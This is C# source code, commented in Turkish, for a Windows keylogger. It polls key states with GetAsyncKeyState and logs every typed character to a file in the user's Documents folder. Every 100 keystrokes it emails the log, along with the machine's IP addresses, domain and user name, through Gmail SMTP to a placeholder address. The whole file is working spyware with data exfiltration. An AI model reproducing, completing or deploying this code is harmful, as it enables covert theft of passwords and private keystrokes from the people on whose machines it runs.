using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(long i);//Bu tanımlamayı, bir sınıf içerisinde yaparsak, bir Windows API si olarak gerçeklenmiş olan, GetAsyncKeyState adında, sınıfımıza ait, özel bir metot elde etmiş oluruz. Bu metot dışarıdan long türünde bir klavye kodu değeri alacak ve daha sonra bir int değer döndürecektir. Şayet int türünden döndürdüğü değer 0 ise, başta yollanan numaraya karşılık gelen tuşa basılmamış demektir. 

        //bütün keystrokeları tutacak bir string
        static int numberOfKeyStrokes = 0; 
        static void Main(string[] args)
        {
            
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            string path = (filePath + @"\file.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path));

            }
            //hangi tuşa basıldığını yakalama ve konsolda gösterme
            while (true)
            {
                int[] turkceKarakterler =  {128,129,135,148,153,154,173 };
                //Önce biraz bekleyip diğer programların çalışmasına izin veriyoruz.
                Thread.Sleep(5);
                //Basılan Tuşların hangi tuş olduklarını anlama.
                for (int i = 32; i < 128; i++)//ASCII tablosunda normal klavye tuşları 32 ile başlar(Space tuşu) ve 127. tuş ile de biter(DEL)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState==32769)//herhangi bir tuşa basılmadığında sürekli 0 yazmasını engelliyoruz ve 32768 tuşundan farklı bir tuşa basıldığında bir çıktı verilmesini de sağlıyoruz.
                    {
                    Console.Write((char)i + ",");
                        //basılan tuşları bir text dosyasına kaydetme
                        using (StreamWriter sw = File.AppendText(path)) 
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeyStrokes++;

                        //her 100 harfte bir mail göndersin

                        if (numberOfKeyStrokes % 100 == 0)
                        {
                            SendNewMessage();

                        }
                    }
                    

                }
                //for (int i = 0; i < turkceKarakterler.Length; i++)
                //{
                //        int tusState = GetAsyncKeyState(turkceKarakterler[i]);
                //        if (tusState==32769)
                //        {
                //            Console.Write((char)turkceKarakterler[i] + ",");

                //        }
                //}
                //türkçe karakter kullanmaya çalıştım ama olmadı çünkü getasynckeystate fonksiyonunun nasıl çalıştığını anlayamadım


            



            

                    
                
            }
            
        }//main

        static void SendNewMessage()
        {//bu text dosyasını bir emaile gönderme
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\file.txt";
            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            //Mail oluşturma
            DateTime now = DateTime.Now;
            string subject = "Keylogger günlük rutini";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var adress in host.AddressList)
            {
                emailBody += "Adress: " + adress;

            }

            emailBody += "\n User: " + Environment.UserDomainName + "\\ " + Environment.UserName;
            emailBody += "\n Host " + host;
            emailBody += "\n Time " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailmessage = new MailMessage();

            mailmessage.From = new MailAddress("aaa@gmail.com");
            mailmessage.To.Add("aaa@gmail.com");
            mailmessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("aaa@gmail.com", "password");
            mailmessage.Body = emailBody;

            client.Send(mailmessage);


        }
    }
}
